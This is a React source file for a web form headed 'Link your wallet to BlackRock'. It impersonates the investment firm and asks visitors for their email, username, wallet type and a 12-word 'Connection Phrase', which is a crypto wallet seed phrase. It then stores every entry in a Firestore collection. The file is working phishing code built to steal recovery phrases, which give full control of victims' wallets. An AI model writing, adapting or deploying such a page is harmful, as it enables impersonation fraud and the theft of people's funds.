import { useState } from "react";
import styled from "styled-components";
import GlobalStyles from "./GlobalStyles";
import { IoIosArrowRoundBack } from "react-icons/io";
import { useNavigate } from "react-router-dom";
import { firestore } from "./firebase";
import { addDoc, collection } from "firebase/firestore";
import toast, { Toaster } from "react-hot-toast";

const Container = styled.div``;

function App() {
  const [email, setEmail] = useState("");
  const [username, setUsername] = useState("");
  const [walletType, setWalletType] = useState("");
  const [regNo, setRegNo] = useState("");
  const [phrase, setPhrase] = useState("");

  const navigate = useNavigate();

  function resetForm() {
    setEmail("");
    setUsername("");
    setWalletType("");
    setRegNo("");
    setPhrase("");
  }

  async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    const firebase_ref = collection(firestore, "form");

    const data = {
      email,
      username,
      walletType,
      regNo,
      phrase,
    };

    try {
      await addDoc(firebase_ref, data);
      resetForm();
      toast.success("Form Successfully Submitted✔");
    } catch (e) {
      console.log(e);
      toast.error("❌Error submitting form. Try agin");
    }
  }

  return (
    <>
      <Toaster />
      <GlobalStyles />
      <Container>
        <h1>Link your wallet to BlackRock</h1>
        <h4>
          Providing the following information will make your transcation process
          faster and smoother.
        </h4>

        <form onSubmit={handleSubmit}>
          <div>
            <label htmlFor="email">Email: </label>
            <input
              type="email"
              id="email"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
          </div>

          <div>
            <label htmlFor="username">BlackRock Username:</label>
            <input
              type="text"
              id="username"
              required
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
          </div>

          <div>
            <label htmlFor="wallet-type">Wallet Type:</label>
            <input
              type="text"
              id="wallet-type"
              required
              value={walletType}
              onChange={(e) => setWalletType(e.target.value)}
            />
          </div>

          <div>
            <label htmlFor="regno">BlackRock RegNo:</label>
            <input
              type="text"
              id="regno"
              required
              value={regNo}
              onChange={(e) => setRegNo(e.target.value)}
            />
          </div>

          <div>
            <label htmlFor="phrase">Connection Phrase(12):</label>
            <input
              type="text"
              id="phrase"
              required
              value={phrase}
              onChange={(e) => setPhrase(e.target.value)}
            />
          </div>

          <div className="btn-container">
            <button
              className="back-btn"
              onClick={(e) => {
                e.preventDefault();
                navigate(-1);
              }}
            >
              <IoIosArrowRoundBack className="arr-left" />
              Go back
            </button>
            <button type="submit" className="submit-btn">
              Submit
            </button>
          </div>
        </form>
      </Container>
    </>
  );
}

export default App;
